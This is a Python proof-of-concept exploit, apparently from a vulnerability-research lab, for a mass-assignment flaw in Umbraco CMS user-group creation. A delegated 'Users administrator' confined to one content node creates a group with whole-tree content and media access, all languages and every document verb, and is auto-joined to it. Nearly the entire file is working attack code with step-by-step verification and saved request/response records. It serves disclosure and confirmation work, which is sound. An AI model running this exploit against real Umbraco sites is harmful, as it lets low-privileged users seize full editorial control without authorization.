#!/usr/bin/env python3
"""
VULN-051 — UserGroup create mass-assignment → a delegated "Users administrator"
           self-escalates to whole-tree / all-language / all-verb access.

Vulnerable code (targets/Umbraco-CMS):
  * src/Umbraco.Core/Services/UserGroupPermissionService.cs:77-106  (ValidateAccess)
        validates ONLY: HasAccessToUsersSection (:79-83), AllowedSections ⊆ caller
        (:86-90 → :122-131), specific content start-node path access (:93-97 → :139-154),
        specific media start-node path access (:99-103 → :162-177).
        It does NOT validate HasAccessToAllLanguages / AllowedLanguages, granular
        Permissions / FallbackPermissions, StartElementId/element-root, and — the key —
        a ROOT start node (-1) sails through: GetById(-1) == null → return true (:146-151).
  * src/Umbraco.Cms.Api.Management/Factories/UserGroupPresentationFactory.cs:264-272
        `else if (source.DocumentRootAccess) target.StartContentId = Constants.System.Root;`
        so documentRootAccess:true maps to StartContentId = -1 (the bypassed value).
  * src/Umbraco.Core/Services/UserGroupService.cs:747-758 EnsureNonAdminUserIsInSavedUserGroup,
        called on create at :385-386 — auto-joins the non-admin creator to the group it made.
        (CreateUserGroupController has NO members parameter, yet the creator becomes a member.)

Class: Mass assignment → vertical privilege escalation (CWE-915, CWE-269, CWE-266).

Flaw (plain English):
  Umbraco lets an admin delegate user management by giving a non-admin group the Users section.
  Such a "Users administrator" may create user groups. ValidateAccess stops it from granting a
  section it lacks or a *specific* content/media subtree it can't reach — but it never checks the
  group's languages, granular verbs, element-root, or *root* content/media access. Because the
  request maps documentRootAccess:true to StartContentId = -1 and GetById(-1) is null, whole-tree
  access is accepted while a specific out-of-scope node is rejected: the delegate is told "no" to a
  single foreign node yet "yes" to the entire tree that contains it. UserGroupService then auto-joins
  the creator to that group, so the Users-delegate silently grants *itself* whole-tree/all-language/
  all-verb rights it was provisioned without.

Exploitation idea:
  Provision a delegate confined to Content start-node D1 (no root, no all-languages, read-only verb)
  + the Users section. As that delegate:
   (1) prove the boundary is real: creating a group whose documentStartNode is the out-of-scope
       sibling D2 → REJECTED (UnauthorizedMissingContentStartNodeAccess);
   (2) create a group with documentRootAccess:true (a *superset* of D2!) + mediaRootAccess:true +
       elementRootAccess:true + hasAccessToAllLanguages:true + all document verbs → 201 ACCEPTED;
   (3) show documentRootAccess:true persisted on the new group and that the delegate was auto-joined
       to it (admin read of the delegate's own user record now lists the new group).

A successful run proves: a non-admin Users-delegate persisted — and became a member of — a group that
grants the whole content/media tree, all languages and every document verb, INCLUDING access it was
explicitly denied one request earlier when it asked for the same subtree as a specific node.
"""
import json
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c

VID = "VULN-051"

USERS = "Umb.Section.Users"
CONTENT = "Umb.Section.Content"
SETTINGS = "Umb.Section.Settings"  # a section the delegate does NOT hold (for a contrast)

BROAD_VERBS = [
    "Umb.Document.Read", "Umb.Document.Create", "Umb.Document.Update", "Umb.Document.Delete",
    "Umb.Document.Publish", "Umb.Document.Unpublish", "Umb.Document.Move", "Umb.Document.Sort",
    "Umb.Document.Rollback", "Umb.Document.Permissions", "Umb.Document.PublicAccess",
    "Umb.Document.CultureAndHostnames", "Umb.Document.Duplicate", "Umb.Document.Notifications",
]


def admin_client_retry(tries=6):
    """The lab admin is shared; a sibling brute-force/lockout exploit can transiently lock it.
    Retry through transient lock / 5xx / 'database is locked'."""
    last = None
    for i in range(tries):
        try:
            return c.admin_client()
        except Exception as e:  # noqa: BLE001
            last = e
            msg = str(e).lower()
            if any(t in msg for t in ("locked", "500", "database is locked", "timeout")):
                c.log("INFO", f"admin auth transient error (attempt {i + 1}/{tries}): {str(e)[:120]}")
                time.sleep(3)
                continue
            raise
    raise RuntimeError(f"admin auth failed after {tries} tries: {last}")


def group_payload(sections, **over):
    """Full CreateUserGroupRequestModel. Restricted-by-default; override any field.
    Required fields: name, alias, sections, languages, hasAccessToAllLanguages,
    fallbackPermissions, permissions."""
    suffix = c.rnd(4)
    p = {
        "name": over.pop("name", f"vg_{suffix}"),
        "alias": over.pop("alias", f"vg{suffix}"),
        "icon": "icon-users",
        "sections": sections,
        "languages": [],
        "hasAccessToAllLanguages": False,
        "documentStartNode": None,
        "documentRootAccess": False,
        "mediaStartNode": None,
        "mediaRootAccess": False,
        "elementStartNode": None,
        "elementRootAccess": False,
        "fallbackPermissions": ["Umb.Document.Read"],
        "permissions": [],
    }
    p.update(over)
    return p


def post_group(client, payload):
    r = client.post("/user-group", json=payload)
    gid = None
    loc = r.headers.get("Location", "")
    if loc:
        gid = loc.rstrip("/").split("/")[-1]
    if not gid:
        try:
            gid = r.json().get("id")
        except Exception:  # noqa: BLE001
            pass
    return r.status_code, gid, r.text


def main() -> int:
    c.banner(VID, "UserGroup mass-assignment → Users-delegate self-escalates to whole-tree/all-verb/all-language",
             "UserGroupPermissionService.cs:77-106 ValidateAccess (root -1 bypass :146-151) + "
             "UserGroupService.cs:747-758 auto-join")

    admin = admin_client_retry()
    c.log("SETUP", "admin authenticated to Management API")

    # --- content: D1 (in-scope start node) and D2 (out-of-scope sibling, the contrast target) ---
    dt = c.create_doctype(admin)
    d1 = c.create_document(admin, dt["id"], f"Dept-A {c.rnd(2)}", dt["propAlias"], "in-scope")
    d2 = c.create_document(admin, dt["id"], f"Dept-B {c.rnd(2)}", dt["propAlias"], "OUT-of-scope")
    c.log("SETUP", f"D1 (in-scope) = {d1}")
    c.log("SETUP", f"D2 (out-of-scope sibling) = {d2}")

    # --- the delegate's provisioned group: Users + Content, confined to D1, NO root, read-only, 1-language-less ---
    deleg_group = group_payload(
        [USERS, CONTENT],
        name=f"UserAdminDeleg_{c.rnd(3)}",
        documentStartNode={"id": d1},
        documentRootAccess=False,
        hasAccessToAllLanguages=False,
        fallbackPermissions=["Umb.Document.Read"],
    )
    st, gd, body = post_group(admin, deleg_group)
    if st not in (200, 201) or not gd:
        return c.verdict(VID, "FAILED", f"could not provision delegate group (HTTP {st}): {body[:200]}")
    c.log("SETUP", f"delegate group {deleg_group['alias']} = {gd} "
                   "(Users+Content, start node=D1, NO doc-root, read-only, NOT all-languages)")

    pw = f"Deleg_{c.rnd(6)}!aA1"
    u = c.create_user(admin, [gd])
    c.set_password_for_user(admin, u["id"], pw)
    c.log("SETUP", f"delegate user {u['email']} (uid={u['id']}) created & password set")

    low = c.ApiClient(u["email"], pw, label="users-delegate")
    before = low.get("/user/current").json()
    c.log("STEP", f"BEFORE (delegate effective access): hasDocumentRootAccess={before.get('hasDocumentRootAccess')}, "
                  f"hasMediaRootAccess={before.get('hasMediaRootAccess')}, "
                  f"hasAccessToAllLanguages={before.get('hasAccessToAllLanguages')}, "
                  f"docStartNodes={[n.get('id') for n in before.get('documentStartNodeIds', [])]}, "
                  f"fallbackPermissions={sorted(before.get('fallbackPermissions', []))}")

    ok = True

    # ---- CONTRAST A: the delegate may NOT grant a section it does not hold ----
    c.log("STEP", "contrast: as delegate, create a group that includes the Settings section (delegate lacks it)")
    st_a, _, body_a = post_group(low, group_payload([USERS, CONTENT, SETTINGS], name=f"try_settings_{c.rnd(3)}"))
    if st_a in (200, 201):
        c.log("FAIL", f"section escalation unexpectedly ACCEPTED (HTTP {st_a}) — ValidateAccess section check absent?")
        ok = False
    else:
        c.log("PROOF", f"section grant → HTTP {st_a} (blocked) — ValidateAccess enforces AllowedSections ⊆ caller")

    # ---- CONTRAST B: the delegate may NOT grant a SPECIFIC out-of-scope node (D2) ----
    c.log("STEP", f"contrast: as delegate, create a group with documentStartNode = D2 ({d2}) — a specific out-of-scope node")
    st_b, _, body_b = post_group(low, group_payload([USERS, CONTENT], name=f"try_node_{c.rnd(3)}",
                                                     documentStartNode={"id": d2}))
    if st_b in (200, 201):
        c.log("FAIL", f"specific out-of-scope node D2 unexpectedly ACCEPTED (HTTP {st_b})")
        ok = False
    else:
        c.log("PROOF", f"specific out-of-scope node D2 → HTTP {st_b} (blocked, "
                       "UnauthorizedMissingContentStartNodeAccess) — the per-node check DOES work")

    # ---- ATTACK: grant the WHOLE tree (superset of D2) + all media + all languages + all verbs ----
    c.log("STEP", "attack: as delegate, create a group with documentRootAccess=true (whole tree ⊃ D2), "
                  "mediaRootAccess=true, elementRootAccess=true, hasAccessToAllLanguages=true, ALL document verbs")
    esc = group_payload(
        [USERS, CONTENT],
        name=f"SelfEscalation_{c.rnd(3)}",
        documentStartNode=None, documentRootAccess=True,
        mediaStartNode=None, mediaRootAccess=True,
        elementStartNode=None, elementRootAccess=True,
        hasAccessToAllLanguages=True,
        fallbackPermissions=BROAD_VERBS,
    )
    st_c, esc_id, body_c = post_group(low, esc)
    if st_c in (200, 201) and esc_id:
        c.log("PROOF", f"escalation group ACCEPTED → HTTP {st_c}, id={esc_id} "
                       "(whole-tree root access granted where a specific node in that tree was just refused)")
    else:
        c.log("FAIL", f"escalation group rejected (HTTP {st_c}): {body_c[:250]}")
        ok = False
        esc_id = None

    # ---- verify the group persisted whole-tree access it should not have been allowed to grant ----
    grp_after = {}
    if esc_id:
        rg = low.get(f"/user-group/{esc_id}")
        if rg.status_code == 200:
            grp_after = rg.json()
            c.log("PROOF", f"GET /user-group/{esc_id}: documentRootAccess={grp_after.get('documentRootAccess')}, "
                           f"mediaRootAccess={grp_after.get('mediaRootAccess')}, "
                           f"hasAccessToAllLanguages={grp_after.get('hasAccessToAllLanguages')}, "
                           f"fallbackPermissions(count)={len(grp_after.get('fallbackPermissions', []))}")
            if not grp_after.get("documentRootAccess"):
                c.log("FAIL", "persisted group does not carry documentRootAccess=true")
                ok = False
        else:
            c.log("INFO", f"GET /user-group/{esc_id} → {rg.status_code}")

    # ---- AUTO-JOIN: the create endpoint has no members param, yet the delegate is now a member ----
    joined = False
    if esc_id:
        ru = admin.get(f"/user/{u['id']}")
        if ru.status_code == 200:
            joined = esc_id.lower() in ru.text.lower()
            c.log("PROOF" if joined else "FAIL",
                  f"admin GET /user/{u['id']}: delegate auto-joined to escalation group = {joined} "
                  "(CreateUserGroupController accepts no members — EnsureNonAdminUserIsInSavedUserGroup added the creator)")
            if not joined:
                ok = False
        else:
            c.log("INFO", f"admin GET /user/{u['id']} → {ru.status_code}")

    # ---- EFFECTIVE (best-effort): re-login delegate and re-read /user/current ----
    # NOTE: /user/current → IUserService.GetAsync → UserRepository.Get(int id) is cached for 5 min
    # (RepositoryCacheConstants.DefaultCacheDuration), and the delegate's own earlier authenticated
    # requests populated that entry pre-escalation. So this may lag; the decisive proof is above.
    after = {}
    flipped = False
    for attempt in range(3):
        low2 = c.ApiClient(u["email"], pw, label="users-delegate-refresh")
        after = low2.get("/user/current").json()
        flipped = bool(after.get("hasDocumentRootAccess")) and not before.get("hasDocumentRootAccess")
        if flipped:
            break
        time.sleep(2)
    if flipped:
        c.log("PROOF", f"AFTER (delegate effective access): hasDocumentRootAccess={after.get('hasDocumentRootAccess')}, "
                       f"hasMediaRootAccess={after.get('hasMediaRootAccess')}, "
                       f"hasAccessToAllLanguages={after.get('hasAccessToAllLanguages')}, "
                       f"fallbackPermissions={sorted(after.get('fallbackPermissions', []))} — "
                       "effective privilege escalated false→true")
    else:
        c.log("INFO", f"effective /user/current still shows hasDocumentRootAccess={after.get('hasDocumentRootAccess')} "
                      "(5-min user cache lag; escalation is proven by the persisted group + auto-join above and "
                      "takes effect on the next uncached read / session)")

    # ---- persist decisive request/response ----
    here = os.path.dirname(__file__)
    with open(os.path.join(here, "request.http"), "w") as f:
        f.write("# All requests below are sent as the NON-ADMIN Users-delegate bearer.\n\n")
        f.write("### CONTRAST — specific out-of-scope node D2 (REJECTED):\n")
        f.write(f"POST {c.MGMT}/user-group HTTP/1.1\nAuthorization: Bearer <users-delegate-token>\n"
                f"Content-Type: application/json\n\n"
                f"{json.dumps(group_payload([USERS, CONTENT], name='try_node', documentStartNode={'id': d2}), indent=2)}\n\n")
        f.write("### ATTACK — whole-tree root access + all media + all languages + all verbs (ACCEPTED):\n")
        f.write(f"POST {c.MGMT}/user-group HTTP/1.1\nAuthorization: Bearer <users-delegate-token>\n"
                f"Content-Type: application/json\n\n{json.dumps(esc, indent=2)}\n")
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write(f"contrast: grant unheld section (Settings)      -> HTTP {st_a} (blocked)\n")
        f.write(f"contrast: grant specific out-of-scope node D2  -> HTTP {st_b} (blocked)\n")
        f.write(f"attack:   grant documentRootAccess=true (⊃ D2) -> HTTP {st_c} (accepted) id={esc_id}\n")
        f.write(f"persisted group documentRootAccess             -> {grp_after.get('documentRootAccess')}\n")
        f.write(f"persisted group mediaRootAccess                -> {grp_after.get('mediaRootAccess')}\n")
        f.write(f"persisted group hasAccessToAllLanguages        -> {grp_after.get('hasAccessToAllLanguages')}\n")
        f.write(f"delegate auto-joined to escalation group       -> {joined}\n")
        f.write(f"BEFORE hasDocumentRootAccess                   -> {before.get('hasDocumentRootAccess')}\n")
        f.write(f"AFTER  hasDocumentRootAccess (effective)        -> {after.get('hasDocumentRootAccess')} "
                f"(flipped={flipped})\n")

    # Decisive, cache-independent criteria:
    decisive = (st_b not in (200, 201)) and (st_c in (200, 201)) and bool(grp_after.get("documentRootAccess")) and joined
    if ok and decisive:
        return c.verdict(VID, "CONFIRMED",
                         "Users-delegate (confined to node D1) was refused node D2 yet granted+auto-joined a "
                         "whole-tree/all-media/all-language/all-verb group ⊃ D2 = vertical privilege escalation")
    return c.verdict(VID, "FAILED", "could not reproduce the group-definition mass-assignment escalation")


if __name__ == "__main__":
    sys.exit(main())
